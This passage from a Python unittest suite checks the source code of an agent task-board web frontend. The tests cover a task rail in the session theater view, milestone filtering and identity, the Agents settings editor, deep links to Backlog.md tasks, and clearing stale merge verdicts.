        return region(self.css, selector + " {", "}",
                      invariant="the " + selector + " rule")

    def test_rail_is_a_theater_column_built_by_its_own_render_function(self):
        # Built in JS and inserted ahead of the moved pane node, so it is
        # the left column; index.html gains no markup at all.
        self.assertIn('attrs: { id: "theater-rail", "aria-label": "Task detail" }', self.rail)
        self.assertIn("theater.insertBefore(rail, theater.firstChild);", self.rail)
        self.assertNotIn("theater-rail", self.html)
        # Created exactly once, in one file.
        self.assertEqual(
            sum(load_static(name).count('id: "theater-rail"') for name in FRONTEND_FILES), 1)
        # The status, milestone, labels, description and acceptance
        # criteria the rail is for.
        body = self._fn(self.pane, "renderTheaterRailBody", "renderTheaterRail")
        self.assertIn('railChip("Status: "', body)
        # task-91 owns the chip label: the title resolved through the
        # project's board data, not the raw "m-0" id.
        self.assertIn("C.milestoneChipLabel(drawer.project, task)", body)
        self.assertIn("task.labels || summary.labels", body)
        self.assertIn('railSection("Description")', body)
        self.assertIn('railSection("Acceptance Criteria"', body)

    def test_the_rail_reads_the_detail_the_drawer_already_fetched(self):
        # That the rail issues no request of its own is observed rather
        # than grepped in tests/test_frontend_behaviour.py: the rail is
        # built inside the Maximize window that makes zero requests.
        # What stays here is where its data comes from -- the drawer's
        # existing /api/task response, stashed next to branchTask, which
        # is the reason there is no second call to see.
        for source in ("C.currentDrawer", "drawer.summary", "drawer.detail", "drawer.branchTask"):
            self.assertIn(source, self.rail, source)
        open_fn = self._fn(self.drawer, "openDrawer", "branchTaskDiffersFromMain")
        self.assertIn("C.currentDrawer.branchTask = branchTask;", open_fn)
        self.assertIn("C.currentDrawer.detail = task2;", open_fn)
        self.assertIn("if (C.refreshTheaterRail) C.refreshTheaterRail();", open_fn)
        self.assertEqual(
            sum(load_static(name).count('fetch("/api/task?') for name in FRONTEND_FILES), 1)

    def test_acceptance_criteria_come_from_the_branch_and_say_so(self):
        body = self._fn(self.pane, "renderTheaterRailBody", "renderTheaterRail")
        self.assertIn("var branchAc = (branch && branch.acceptanceCriteria) || [];", body)
        self.assertIn("var fromBranch = branchAc.length > 0;", body)
        self.assertIn("var ac = fromBranch ? branchAc : (task.acceptanceCriteria || []);", body)
        # Which copy is on screen is stated, never left to be inferred
        # from the ticks.
        self.assertIn('fromBranch ? "agent branch" : "main"', body)
        self.assertIn("these ticks move as the agent works", body)
        self.assertIn(".theater-rail-source {", self.css)

    def test_rail_carries_no_lifecycle_action(self):
        # The theater reads and replies; the drawer acts. Nothing in the
        # rail spawns, merges, resumes, cleans up or ends a session.
        for forbidden in ("handleSpawnClick", "handleRespawnClick", "handleResumeClick",
                          "handleCleanupClick", "handleAdoptDoneClick", "handleReconcileClick",
                          "harvestTask(", "renderEndSessionButton", "renderDrawerSpawnArea",
                          "renderDrawerHarvestArea", "btn-primary", "btn-danger-outline"):
            self.assertNotIn(forbidden, self.rail, forbidden)
        # Exactly one button in the rail block: the collapse control.
        self.assertEqual(self.rail.count('C.h("button"'), 1)
        self.assertIn("Spawn, Merge, Resume and End session stay in the task drawer.", self.rail)
        # The acceptance-criteria checkboxes are read-only, like the
        # drawer's.
        self.assertIn("cb.disabled = true;", self._fn(self.pane, "railAcItem", "renderTheaterRailBody"))

    def test_collapse_control_follows_the_wide_mode_idiom_and_persists(self):
        render = self._fn(self.pane, "renderTheaterRail", "removeTheaterRail")
        self.assertIn('attrs: { id: "theater-rail-toggle", type: "button", "aria-pressed": "true" }', render)
        self.assertIn("onclick: toggleTheaterRail", render)
        # It lives in the pane section header, in the slot the
        # theater-hidden Expand/Narrow toggle occupies in the drawer.
        self.assertIn('var slot = C.byId("drawer-pane-theater-toggle");', render)
        self.assertIn("slot.parentNode.insertBefore(", render)
        # Both labels are real copy, not an icon only (as in task-68).
        self.assertIn('collapsed ? "Show task" : "Hide task"', self.rail)
        # One writer of the rail's DOM state, and it touches nothing else.
        apply_fn = self._fn(self.pane, "applyTheaterRail", "toggleTheaterRail")
        self.assertIn('theater.classList.toggle("has-rail", hasRail);', apply_fn)
        self.assertIn('theater.classList.toggle("rail-collapsed", hasRail && collapsed);', apply_fn)
        toggle_fn = self._fn(self.pane, "toggleTheaterRail", "railChip")
        self.assertIn("C.persistTheaterRailCollapsed(C.theaterRailCollapsed);", toggle_fn)
        self.assertIn("applyTheaterRail();", toggle_fn)
        # The preference is a per-viewer localStorage key with the same
        # fault tolerance as centrale-drawer-wide -- never product config.
        keys_start = self.state.index("var VIEW_STATE_KEYS = {")
        keys_end = self.state.index("};", keys_start)
        self.assertIn('theaterRailCollapsed: "centrale-theater-rail-collapsed"',
                      self.state[keys_start:keys_end])
        read = self._fn(self.state, "readStoredTheaterRailCollapsed", "persistTheaterRailCollapsed")
        self.assertIn("try {", read)
        self.assertIn("catch (e)", read)
        self.assertIn("return false;", read)  # storage failure -> the rail shows
        self.assertIn('getItem(VIEW_STATE_KEYS.theaterRailCollapsed) === "1"', read)
        persist = function_body(self.state, "persistTheaterRailCollapsed")
        self.assertIn('setItem(VIEW_STATE_KEYS.theaterRailCollapsed, value ? "1" : "0")', persist)
        self.assertNotIn("theaterRail", function_body(self.settings, "saveSettings"))
        self.assertEqual(
            sum(load_static(name).count("VIEW_STATE_KEYS.theaterRailCollapsed")
                for name in FRONTEND_FILES), 2)
        self.assertIn("C.theaterRailCollapsed = readStoredTheaterRailCollapsed();", self.state)

    def test_narrow_viewport_collapses_the_rail_by_itself(self):
        self.assertIn("var THEATER_RAIL_MIN_VIEWPORT_PX = 1000;", self.rail)
        narrow = self._fn(self.pane, "railViewportTooNarrow", "railIsCollapsed")
        self.assertIn("return window.innerWidth < THEATER_RAIL_MIN_VIEWPORT_PX;", narrow)
        collapsed = self._fn(self.pane, "railIsCollapsed", "applyTheaterRail")
        self.assertIn("return !!C.theaterRailCollapsed || railViewportTooNarrow();", collapsed)
        # The control says why it is unavailable rather than lying about
        # a rail the viewport will not allow, and the stored preference is
        # left alone so it comes back on a wider window.
        apply_fn = self._fn(self.pane, "applyTheaterRail", "toggleTheaterRail")
        self.assertIn("btn.disabled = forced;", apply_fn)
        self.assertIn("The window is too narrow for the task rail", apply_fn)
        toggle_fn = self._fn(self.pane, "toggleTheaterRail", "railChip")
        self.assertIn("if (railViewportTooNarrow()) return;", toggle_fn)
        # Crossing the threshold with the theater open re-decides it.
        self.assertIn('window.addEventListener("resize", function () {', self.rail)
        self.assertIn('if (C.byId("theater-rail")) applyTheaterRail();', self.rail)

    def test_the_rail_is_contained_enough_to_revert(self):
        # Exactly two call lines reach the rail from the task-73 theater,
        # and they are each other's inverse.
        open_fn = self._fn(self.pane, "openTheater", "closeTheater")
        close_fn = self._fn(self.pane, "closeTheater", "toggleTheater")
        self.assertEqual(open_fn.count("renderTheaterRail();"), 1)
        self.assertEqual(close_fn.count("removeTheaterRail();"), 1)
        self.assertNotIn("removeTheaterRail();", open_fn)
        self.assertNotIn("renderTheaterRail();", close_fn)
        remove = self._fn(self.pane, "removeTheaterRail", "refreshTheaterRail")
        for node in ('C.byId("theater-rail")', 'C.byId("theater-rail-toggle")'):
            self.assertIn(node, remove, node)
        self.assertEqual(remove.count("removeChild"), 2)
        # The pane rendering path the rail sits next to is untouched: the
        # skeleton still builds exactly the task-73 header controls.
        skeleton = self._fn(self.pane, "renderDrawerPaneSkeleton", "paneScrollState")
        self.assertNotIn("theater-rail", skeleton)
        # Its own CSS block, keyed on classes that exist only while the
        # rail does -- so removing the block leaves the task-73 rules
        # (checked by SessionTheaterContractTests) exactly as they were.
        self.assertIn("/* ---------------- Session theater: task rail (task-93) ---------------- */", self.css)
        self.assertIn("#theater.has-rail { flex-direction: row; }", self.css)
        self.assertIn("#theater.has-rail > #drawer-pane-area:not(:empty) { min-width: 0; }", self.css)
        self.assertIn("#theater.rail-collapsed .theater-rail { display: none; }", self.css)
        rail_css = self._css_block(".theater-rail")
        self.assertIn("flex: 0 0 320px;", rail_css)
        self.assertIn("overflow-y: auto;", rail_css)
        # Neither class is written anywhere but the one applier.
        for cls in ('"has-rail"', '"rail-collapsed"'):
            self.assertEqual(
                sum(load_static(name).count(cls) for name in FRONTEND_FILES), 1, cls)


# Task-114's live-pane cadence (Maximize opening on the newest output,
# and the one poller changing its INTERVAL after a send rather than
# gaining a second timer) had a source-text class of its own here.
# task-108 replaced it wholesale: every claim it made is about what the
# poller does over time, so all of it is now driven in
# tests/test_frontend_behaviour.py, where the delays the single timer is
# armed with are read off directly.


class DrawerSpawnAreaJustMergedTests(unittest.TestCase):
    """Task-41 AC #2/#4: after a successful in-drawer merge, the drawer's
    spawn area must render nothing in that same render pass -- not fall
    through to a Spawn button using currentDrawer.summary's stale
    pre-merge fields (status "In Progress", ready true) until the next
    board refetch lands. static/index.html has no JS execution test
    harness in this repo (renderDrawerSpawnArea's sibling change,
    effectiveHasSpawnBranch/justMerged for the Merge button, shipped in
    TASK-26 with no JS-level test either) -- so this is a structural
    check on the source itself: renderDrawerSpawnArea must read the same
    justMerged signal the card already uses (harvestStates[key].status
    === "success"), positioned after the effectiveHasSpawnBranch branch
    and before the `!task.ready` check that would otherwise still fall
    through to Spawn using the stale summary.
    """

    def setUp(self):
        self.body = region(
            load_static("drawer.js"),   # task-89
            "function renderDrawerSpawnArea()", "function renderDrawerRespawnAction(",
            invariant="the drawer's spawn area")

    def test_just_merged_check_sits_between_effective_branch_and_not_ready(self):
        effective_branch_idx = self.body.index(
            "C.effectiveHasSpawnBranch(task, projectName, taskId) && !live"
        )
        not_ready_idx = self.body.index("if (!task.ready && !live)")
        just_merged_idx = self.body.index("var justMerged")

        self.assertGreater(
            just_merged_idx, effective_branch_idx,
            "the justMerged check must come after the effectiveHasSpawnBranch branch",
        )
        self.assertLess(
            just_merged_idx, not_ready_idx,
            "the justMerged check must come before the stale !task.ready fallthrough",
        )

    def test_just_merged_uses_the_same_harveststates_success_signal_as_the_card(self):
        just_merged_idx = self.body.index("var justMerged")
        not_ready_idx = self.body.index("if (!task.ready && !live)")
        preceding_block = self.body[:just_merged_idx]
        just_merged_block = self.body[just_merged_idx:not_ready_idx]
        self.assertIn("C.harvestStates[", preceding_block)
        self.assertIn('.status === "success"', just_merged_block)

    def test_just_merged_bails_out_before_the_not_ready_fallthrough(self):
        just_merged_idx = self.body.index("var justMerged")
        not_ready_idx = self.body.index("if (!task.ready && !live)")
        just_merged_block = self.body[just_merged_idx:not_ready_idx]
        self.assertIn("return", just_merged_block)


class AgentIdleBadgeContractTests(unittest.TestCase):
    """Static contract tests for the vanilla frontend lifecycle mapping."""

    @classmethod
    def setUpClass(cls):
        # task-89: the badge specs and the state mapping are tasks.js;
        # the drawer decides when the End-session button is offered.
        cls.js = load_static("tasks.js")
        cls.drawer = load_static("drawer.js")
        cls.css = load_static("styles.css")

    def test_idle_badge_has_honest_copy_tooltip_and_distinct_style(self):
        self.assertIn(".agent-badge-idle {", self.css)
        self.assertIn('text: "turn ended · may need input"', self.js)
        self.assertIn("same turn-end event when it is done", self.js)
        self.assertIn('finished: { className: "agent-badge agent-badge-finished", text: "finished" }', self.js)

    def test_idle_is_actionable_for_a_live_session(self):
        # task-120 inverted the rule this used to read off an allowlist
        # (`finished: true, idle: true`): End session is now offered for
        # EVERY live session. task-132 then retired the last disabled
        # state: a state that positively says the agent is mid-turn no
        # longer withholds the button, it makes the first click ARM it
        # and the second click end it. So the claim about "idle" is that
        # it is absent from the arm map -- which is `working` and
        # nothing else -- and ends on one click. The behavioural half
        # (what the drawer and the sessions panel actually render and
        # do for each state) lives in test_frontend_behaviour.py's
        # NoWayOutSessionBehaviourTests and EndSessionArmBehaviourTests.
        arms = region(
            self.js,
            "var END_SESSION_ARM_REASONS = {",
            "\n  };",
            invariant="the states End session asks a second click for")
        self.assertIn("working:", arms)
        for one_click in ("idle:", "finished:", "waiting:", "unknown:"):
            self.assertNotIn(one_click, arms)
        self.assertIn(
            'displayState === "waiting" || displayState === "idle"',
            self.drawer,
        )

    def test_likely_finished_fallback_is_unchanged(self):
        # task-63 refactored effectiveAgentState: rawState is normalized
        # first (`rawState || "unknown"`), so the fallback condition tests
        # the normalized `state` -- behaviorally identical to the original
        # `(rawState === "unknown" || !rawState) && ...` expression this
        # test asserted before the two branches merged.
        self.assertIn('var state = rawState || "unknown";', self.js)
        self.assertIn(
            'state === "unknown" && live && branchTask && branchTask.status === "Done"',
            self.js,
        )
        self.assertIn('return "likely-finished";', self.js)


if __name__ == "__main__":
    unittest.main()


class AgentsEditorContractTests(unittest.TestCase):
    """Task-78: hermetic source-level checks of the settings modal's Agents
    editor (browser behavior is covered by the Playwright run recorded in
    the task). Pins the anti-clutter shape the task agreed on: the editor
    is ONE <details> section, collapsed by default (no `open` attribute in
    the markup, and reset to closed on every modal open) -- no tabs; it
    names its backing store (projects.json's "agents" map); the default-
    agent picker lives inside it; and Save only posts an `agents` field
    when the section was actually touched, so an untouched save never
    rewrites the map."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.js = load_static("settings.js")   # task-89
        cls.section = region(
            cls.html, '<details class="settings-section" id="settings-agents-section">',
            "</details>", invariant="the settings modal's Agents section")

    def test_one_details_section_collapsed_by_default_and_no_tabs(self):
        self.assertEqual(self.html.count('id="settings-agents-section"'), 1)
        opening_tag = self.html[self.html.index('<details class="settings-section" id="settings-agents-section"'):]
        opening_tag = opening_tag[:opening_tag.index(">") + 1]
        self.assertNotIn(" open", opening_tag)
        self.assertIn('C.byId("settings-agents-section").open = false;', self.js)
        # Neither the markup nor any frontend file introduces tabs (the
        # negative covers every file, not just the one that owns the
        # editor, so tabs cannot reappear next door).
        for name in ["index.html"] + FRONTEND_FILES:
            source = load_static(name)
            self.assertNotIn('role="tablist"', source, name)
            self.assertNotIn("settings-tab", source, name)

    def test_summary_names_the_count_and_default(self):
        self.assertIn('<summary id="settings-agents-summary"', self.section)
        self.assertIn('"Agents (" + count + " configured"', self.js)
        self.assertIn('", default: " + current', self.js)

    def test_section_names_its_backing_store(self):
        self.assertIn("projects.json", self.section)
        self.assertIn('"agents"', self.section)
        self.assertIn("hand-edit", self.section)

    def test_default_agent_picker_lives_inside_the_section(self):
        self.assertIn('<select id="settings-default-agent"', self.section)
        self.assertEqual(self.html.count('id="settings-default-agent"'), 1)

    def test_builtins_are_locked_and_non_deletable_user_rows_are_not(self):
        self.assertIn("if (row.builtin) {\n        nameInput.readOnly = true;", self.js)
        self.assertIn("if (!row.builtin) {\n        var pending = settingsAgentRemovePending[index];", self.js)

    def test_save_posts_agents_only_when_touched(self):
        self.assertIn("if (settingsAgentsDirty) body.agents = settingsAgentsPayload();", self.js)
        self.assertEqual(
            sum(load_static(name).count("body.agents =") for name in FRONTEND_FILES), 1)

    def test_removing_an_assigned_or_default_agent_arms_with_a_warning_naming_the_fallback(self):
        self.assertIn("tasksAssignedToAgent(name)", self.js)
        self.assertIn("falls back to the default agent (\" + fallback + \")", self.js)
        self.assertIn("is the current default agent; the default will change to \" + fallback", self.js)
        self.assertIn("Click Remove again to confirm.", self.js)

    def test_path_warning_is_shown_not_blocking(self):
        self.assertIn('setSettingsStatus("Saved. Warning: " + warnings.join(" "), "warning");', self.js)
        self.assertIn('text: "not on PATH"', self.js)


class BoardSearchContractTests(unittest.TestCase):
    """Task-87: the one board-wide text predicate searches the task fields
    users can see on a card, while milestone remains its own filter."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        # task-89: the filtering predicate lives in static/tasks.js.
        cls.js = load_static("tasks.js")
        cls.filtering = region(cls.js, "// Filtering", "// Milestones (task-86",
                               invariant="the board's filtering section")

    def test_search_matches_title_task_id_and_labels_case_insensitively(self):
        # Removing any one visible field from the shared predicate must
        # break this contract. indexOf keeps matching substring-style, so
        # both TASK-72 and its numeric portion 72 find that task.
        self.assertIn("function taskMatchesSearch(task, search)", self.filtering)
        predicate_start = self.filtering.index("function taskMatchesSearch(task, search)")
        predicate_end = self.filtering.index("function getFilteredItems()", predicate_start)
        predicate = self.filtering[predicate_start:predicate_end]
        for field in ("task.title", "task.id", "task.labels"):
            self.assertIn(field, predicate)
        self.assertIn(".toLowerCase()", predicate)
        self.assertIn(".indexOf(search)", predicate)
        self.assertNotIn("task.milestone", predicate)
        self.assertNotIn("taskMilestone", predicate)
        self.assertIn("if (!taskMatchesSearch(task, search)) return;", self.filtering)


class MilestoneSurfacingContractTests(unittest.TestCase):
    """What is left of task-86 once the surfacing is driven.

    The card chip, the drawer row, the dropdown's options, counts and
    hidden state, the shared filter gate and what a selection change
    re-renders are all read off one rendered board in
    tests/test_frontend_behaviour.py (MilestoneSurfacingBehaviourTests).

    Four things are left, each for a different reason. The CSS is what
    makes a milestone chip not read as another label, and the shim has
    no stylesheet. The shell markup must host an EMPTY `<select>`: a
    hardcoded `<option>` there would be a second source of truth, and a
    driven test would render it just as happily as a derived one. The
    filter gate's one-occurrence count is a claim about every frontend
    file, not about the render that was walked. And the lane-scroll
    capture cannot be observed at all here -- the restore clamps the
    saved offset against a freshly built element's height, which a shim
    with no layout gives as zero.
    """

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.css = load_static("styles.css")
        cls.board_js = load_static("board.js")
        cls.main_js = load_static("main.js")
        cls.tasks_js = load_static("tasks.js")
        cls.all_js = "\n".join(load_static(name) for name in FRONTEND_FILES)
        cls.filter_body = region(
            cls.tasks_js, "function getFilteredItems()", "function taskMilestone(task)",
            invariant="the shared filter gate")

    def test_milestone_chip_is_styled_distinctly_from_a_label_chip(self):
        self.assertIn(".milestone-chip {", self.css)
        chip = self.css[self.css.index(".milestone-chip {"):]
        chip = chip[:chip.index("\n  }")]
        label = self.css[self.css.index("  .label-chip {"):]
        label = label[:label.index("\n  }")]
        self.assertIn("var(--accent)", chip)
        self.assertNotIn("var(--accent)", label)
        self.assertIn("border-radius: 999px", chip)
        self.assertNotIn("border-radius: 999px", label)
        # The drawer's own row for the same chip.
        self.assertIn(".drawer-milestone-row {", self.css)

    def test_filter_row_hosts_the_dropdown_and_the_markup_carries_no_options(self):
        self.assertEqual(self.html.count('id="milestone-filter"'), 1)
        row_start = self.html.index('<div id="filter-row">')
        filter_row = self.html[row_start:self.html.index('<div id="loading-hint">', row_start)]
        self.assertIn('id="milestone-field"', filter_row)
        self.assertIn('id="ready-toggle"', filter_row)  # same row as the existing filter
        # Every option is derived at render time from loaded board data;
        # a hardcoded milestone in the shell would be a second source of
        # truth (and stale the moment backlog gains a milestone).
        self.assertIn('<select id="milestone-filter" class="filter-select"></select>', filter_row)

    def test_the_filter_gate_is_written_once_for_every_lane(self):
        # The driven tests show that selecting a milestone narrows every
        # project and every column. This is the other half: there is no
        # SECOND milestone comparison anywhere that could disagree.
        self.assertIn(
            "if (C.milestoneFilter && milestoneKey(project.name, taskMilestone(task)) !== C.milestoneFilter) return;",
            self.filter_body,
        )
        self.assertEqual(
            sum(load_static(name).count("milestoneFilter && milestoneKey(project.name, taskMilestone(task))")
                for name in FRONTEND_FILES), 1)

    def test_the_lane_scroll_capture_still_wraps_the_rebuild(self):
        # task-50's lane offsets survive a re-render because renderBoard
        # captures them before clearing and restores them after. The
        # restore clamps against the new element's scrollHeight, which is
        # a layout measurement -- unobservable in the DOM shim, so this
        # one stays a read of the source.
        board = self.board_js[self.board_js.index("function renderBoard()"):
                              self.board_js.index("function renderColumn(")]
        self.assertIn("var savedScroll = captureColumnScrollPositions(boardEl);", board)
        self.assertIn("restoreColumnScrollPositions(boardEl, savedScroll);", board)
        self.assertLess(board.index("var savedScroll ="), board.index("C.clearChildren(boardEl)"))

    def test_centrale_adds_no_milestone_crud_or_endpoint(self):
        # Thin veneer: creating, renaming, archiving and removing
        # milestones stays the backlog CLI's job. task-91 gave the server
        # exactly one milestone responsibility -- a READ of the id ->
        # title map through that same CLI -- so this no longer asserts
        # the word is absent from server.py, only that nothing there
        # writes a milestone and that no endpoint exposes one.
        self.assertNotIn("/api/milestone", self.all_js)
        with open(os.path.join(os.path.dirname(STATIC_DIR), "server.py"), encoding="utf-8") as f:
            server_src = f.read()
        for write_cmd in ('"milestone", "add"', '"milestone", "rename"',
                          '"milestone", "remove"', '"milestone", "archive"',
                          "--milestone", "--clear-milestone"):
            self.assertNotIn(write_cmd, server_src)
        self.assertNotIn("/api/milestone", server_src)


class MilestoneIdentityContractTests(unittest.TestCase):
    """What is left of task-91 once title-vs-id is driven.

    That the dropdown and both chips read the TITLE while the filter,
    the option values and the stored selection carry the project-
    qualified ID -- and that a rename therefore moves one without
    moving the other -- is observed against one rendered board in
    tests/test_frontend_behaviour.py (MilestoneIdentityBehaviourTests),
    including a project name and a milestone id that both need
    percent-encoding.

    Three things are left, all of them counts or absences across whole
    files rather than facts about a render. The id-only helpers are not
    published on the seam at all, so no renderer can reach one by
    accident -- a driven test can only show that the renderers it walked
    did not. `task.milestoneTitle` is read in exactly one place, so
    there is no second, divergent notion of "the title". And the entry
    map is prototype-free: unlike the option counter's map (whose keys
    are titles straight off the board, and which IS driven), its keys
    always carry a "/" and so cannot reach a shared prototype today --
    `Object.create(null)` is what keeps that true if the key shape ever
    changes, and only a read can say it is still there.
    """

    @classmethod
    def setUpClass(cls):
        cls.tasks_js = load_static("tasks.js")
        cls.all_js = "\n".join(load_static(name) for name in FRONTEND_FILES)
        cls.collect_body = region(
            cls.tasks_js, "function collectMilestones()", "function milestoneOptionLabel(m, qualify)",
            invariant="the milestone option collector")

    def test_the_id_only_helpers_are_not_published_at_all(self):
        self.assertIn("C.milestoneChipLabel = milestoneChipLabel;", self.tasks_js)
        self.assertNotIn("C.taskMilestone(", self.all_js)
        self.assertNotIn("C.taskMilestoneLabel", self.all_js)

    def test_the_frontend_resolves_no_titles_of_its_own(self):
        # The id -> title map is built once per project server-side; the
        # frontend only reads the field that came with the task.
        self.assertNotIn("/api/milestone", self.all_js)
        self.assertNotIn("fetch(", self.collect_body)
        self.assertEqual(
            sum(load_static(name).count("task && task.milestoneTitle") for name in FRONTEND_FILES), 1)

    def test_the_entry_map_cannot_reach_a_shared_prototype(self):
        # Its keys are built from board data. They always contain a "/"
        # today, so none of them can be "__proto__" -- this is what keeps
        # that from mattering if that ever changes.
        self.assertIn("var byKey = Object.create(null);", self.collect_body)


class DrawerOpenTaskLabelContractTests(unittest.TestCase):
    """Task-95: the drawer's action says exactly what it does. Task-92
    made it deep-link to the open task, but the label still read "Open
    board"; it now reads "Open task". The board ROOT open was
    deliberately not added anywhere new -- the sidebar project chip's
    ⧉ already is it (a project-level open on a project-level surface),
    so the drawer header still holds exactly its two controls."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.board = load_static("board.js")

    def test_the_drawer_action_reads_open_task_with_a_matching_tooltip(self):
        self.assertIn(
            '<button id="drawer-open-board" class="btn btn-sm" '
            'title="Open this task on the Backlog.md board">Open task</button>',
            self.html)
        # The stale label is gone from the shell entirely.
        self.assertNotIn(">Open board<", self.html)

    def test_the_drawer_header_still_holds_exactly_two_controls(self):
        start = self.html.index('<div id="drawer-header-actions">')
        actions = self.html[start:self.html.index("</div>", start)]
        self.assertEqual(actions.count("<button"), 2)
        self.assertIn('id="drawer-open-board"', actions)
        self.assertIn('id="drawer-close"', actions)

    def test_the_board_root_open_stays_on_the_project_chip(self):
        # The one board-root open in the UI: a chip, which passes no task
        # id, so C.openProjectBoard returns the base URL untouched. No new
        # control and no new endpoint were added for it (task-95).
        self.assertIn("C.openProjectBoard(name, openBtn);", self.board)
        self.assertEqual(self.board.count("C.openProjectBoard("), 1)


class OpenBoardTaskDeepLinkContractTests(unittest.TestCase):
    """Task-92: the drawer's action (labelled "Open task" since task-95)
    lands on the open task's detail view on the Backlog.md board, not the
    board root. Source-level
    like the rest of the static/ contract tests, plus one node-backed
    check of the real URL builder for a plain and a dotted id."""

    @classmethod
    def setUpClass(cls):
        cls.feedback = load_static("feedback.js")
        cls.pane = load_static("pane.js")
        cls.board = load_static("board.js")
        cls.open_board = function_body(cls.feedback, "openProjectBoard")
        cls.url_for = function_body(cls.feedback, "boardUrlFor")

    def test_url_builder_appends_the_encoded_board_route(self):
        # Backlog.md routes /board/:id; the id is encoded, never pasted
        # raw, and any trailing slash on the server's base URL is trimmed
        # so the join can't produce "//board/".
        self.assertIn('return base + "/board/" + encodeURIComponent(taskId);', self.url_for)
        self.assertIn('var base = String(baseUrl).replace(/\\/+$/, "");', self.url_for)
        # No task id -> the base URL, unchanged: a project-level open.
        self.assertIn("if (!taskId) return base;", self.url_for)

    def test_the_opened_window_goes_through_the_builder(self):
        self.assertIn("function openProjectBoard(projectName, btn, taskId) {", self.feedback)
        self.assertIn('window.open(boardUrlFor(data.url, taskId), "_blank", "noopener");', self.open_board)
        # ...and nothing else in the file opens the raw base URL.
        self.assertNotIn('window.open(data.url', self.feedback)

    def test_the_drawer_passes_its_task_id_and_the_chips_do_not(self):
        self.assertIn(
            "C.openProjectBoard(C.currentDrawer.project, e.currentTarget, C.currentDrawer.id);",
            self.pane)
        # A project chip has no task in hand, so it still opens the root.
        self.assertIn("C.openProjectBoard(name, openBtn);", self.board)

    def test_the_request_and_its_failure_paths_are_untouched(self):
        # The server stays task-unaware: the POST body is still just the
        # project, and no task id reaches /api/browser.
        self.assertIn('body: JSON.stringify({ project: projectName })', self.open_board)
        request_body = self.open_board[self.open_board.index("\n"):self.open_board.index("window.open(")]
        self.assertNotIn("taskId", request_body)
        # In-flight keying, the disable/re-enable pair and the error
        # toast are all exactly as they were.
        self.assertIn("if (browserLaunchInFlight[projectName]) return;", self.open_board)
        self.assertIn("if (btn) btn.disabled = true;", self.open_board)
        self.assertIn("if (btn) btn.disabled = false;", self.open_board)
        self.assertIn(
            'showToast("Failed to open board for " + projectName + ": " + (err.message || err), "error");',
            self.open_board)

    @js_harness.requires_node
    def test_builder_output_for_a_plain_and_a_dotted_id(self):
        # Evaluates the real boardUrlFor source (no shims, no browser):
        # dots are legal in a path segment, so a dotted subtask id needs
        # no escaping of its own -- the tmux-style id encoding Centrale
        # does elsewhere is tmux's constraint, not Backlog's.
        script = self.url_for + """
process.stdout.write(JSON.stringify([
  boardUrlFor("http://127.0.0.1:6424", "TASK-67"),
  boardUrlFor("http://127.0.0.1:6424", "TASK-11.4"),
  boardUrlFor("http://127.0.0.1:6424/", "TASK-67"),
  boardUrlFor("http://127.0.0.1:6424", "")
]));
"""
        proc = subprocess.run(
            [js_harness.node_path(), "-e", script],
            capture_output=True, text=True, timeout=30)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(json.loads(proc.stdout), [
            "http://127.0.0.1:6424/board/TASK-67",
            "http://127.0.0.1:6424/board/TASK-11.4",
            "http://127.0.0.1:6424/board/TASK-67",
            "http://127.0.0.1:6424",
        ])


class StaleMergeVerdictInvalidationTests(unittest.TestCase):
    """Task-94: a remembered merge verdict is a POST response, not
    something re-derived on render, and nothing ever dropped one -- so
    Merge (blocked) -> Resume to reconcile -> End session brought the
    same red gate message back, describing a conflict the agent had
    already resolved. What is left here after task-118 is the source
    SHAPE of the fix: the invalidation rule's own text, its two call
    sites and their ordering, and -- the reason a driven test cannot
    replace these -- that the frontend contains exactly ONE deleter of a
    remembered verdict and exactly TWO callers of /api/harvest. A run
    walks one flow; only a read of every file can say there is no second
    one somewhere else. The reported flow itself is driven in
    tests/test_frontend_behaviour.py (StaleMergeVerdictBehaviourTests)."""

    @classmethod
    def setUpClass(cls):
        cls.harvest = load_static("harvest.js")
        cls.spawn = load_static("spawn.js")
        cls.invalidate = function_body(cls.harvest, "invalidateStaleMergeVerdict")
        cls.end_session = function_body(cls.harvest, "endSession")
        cls.spawn_task = function_body(cls.spawn, "spawnTask")
        cls.resume_task = function_body(cls.spawn, "resumeTask")

    # -- AC #3: only a blocked/error verdict is droppable --

    def test_only_blocked_and_error_verdicts_are_dropped(self):
        self.assertIn(
            'if (state.status !== "blocked" && state.status !== "error") return false;',
            self.invalidate,
        )
        self.assertIn("delete C.harvestStates[key];", self.invalidate)
        # A success verdict (and an in-flight "loading" one) is left in
        # place: the post-merge confirmation line and task-41's
        # justMerged Spawn suppression both read it through the
        # stale-until-refetch window.
        self.assertNotIn('"success"', self.invalidate)
        # ...and this is the ONLY place in the frontend that removes a
        # remembered verdict, so there is no second, unguarded deleter.
        self.assertEqual(
            sum(load_static(name).count("delete C.harvestStates[") for name in FRONTEND_FILES), 1)

    # -- AC #1 / #2: the two moments that invalidate --

    def test_a_successful_spawn_or_resume_invalidates(self):
        for src, name in ((self.spawn_task, "spawnTask"), (self.resume_task, "resumeTask")):
            self.assertIn('C.invalidateStaleMergeVerdict(projectName, taskId);', src, name)
            # In the success handler, after the state is recorded --
            # never on the error path, where the branch did not move.
            call = src.index("C.invalidateStaleMergeVerdict(")
            self.assertLess(src.index('C.spawnStates[key] = { status: "success"'), call, name)
            self.assertLess(call, src.index('status: "error"'), name)

    def test_a_successful_end_session_invalidates_before_the_renders(self):
        call = self.end_session.index("invalidateStaleMergeVerdict(projectName, taskId);")
        self.assertLess(
            self.end_session.index('C.endSessionStates[key] = { status: "success" }'), call)
        # Before doRefresh and before the trailing re-renders -- those
        # are exactly the renders that lift the live-session suppression
        # and would otherwise paint the pre-session verdict again.
        self.assertLess(call, self.end_session.index("C.doRefresh(true);"))
        self.assertLess(call, self.end_session.rindex("C.renderDrawerSessionArea();"))
        self.assertLess(call, self.end_session.index('status: "error"'))

    def test_the_card_reads_the_same_map_the_invalidation_clears(self):
        # AC #1/#2 name the card as well as the drawer. There is no
        # second store to clear: renderCard's gate line is the same
        # C.harvestStates entry the drawer renders, so dropping it
        # empties both at once (the node test below drives the drawer,
        # the one of the two the seam exposes).
        card = load_static("board.js")
        self.assertIn("var hState = C.harvestStates[hKey];", card)
        self.assertIn("C.renderHarvestStatusLine(hState)", card)
